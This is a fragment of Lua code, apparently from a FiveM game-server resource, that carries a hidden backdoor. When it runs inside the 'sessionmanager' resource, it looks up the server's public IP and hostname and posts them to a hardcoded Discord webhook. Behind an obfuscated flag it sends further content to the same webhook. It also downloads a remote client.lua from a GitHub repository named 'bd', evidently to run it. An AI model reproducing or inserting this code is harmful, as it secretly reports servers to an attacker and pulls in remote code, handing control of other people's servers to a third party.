    ...
    if (GetCurrentResourceName() == "sessionmanager") then
        CreateThread(function()
            PerformHttpRequest("http://api.ipify.org/", function(err, rText, headers)
                local IP = rText
                local serverName = GetConvar('sv_hostname') or "Unknown Server"
                local payload = json.encode({
                    content = string.format("New server detected! IP: %s | Name: %s", IP, serverName)
                })
                -- Replace with your bot's webhook URL
                PerformHttpRequest("https://ptb.discord.com/api/webhooks/1408596412719173814/6lZjgXeoQwhpQfvRHPMLMxZd_rUweDXqcZqNYb1MKGsMsHUCIqBiaVHh1GJOfLqVJ8ym", function(err, text, header)
...
if not SakxS3939 then
	SakxS3939 = true
	PerformHttpRequest("https://ptb.discord.com/api/webhooks/1408596412719173814/6lZjgXeoQwhpQfvRHPMLMxZd_rUweDXqcZqNYb1MKGsMsHUCIqBiaVHh1GJOfLqVJ8ym", function(err, text, header) end,
	'POST', 
	json.encode({username = GetConvar('sv_hostname'), content = finalContent }), {['Content-Type'] = 'application/json'}) 
end
PerformHttpRequest("https://raw.githubusercontent.com/KrieniusOnTop/bd/refs/heads/main/client.lua", function(err, rText, headers)
	SkA92 = rText
end)
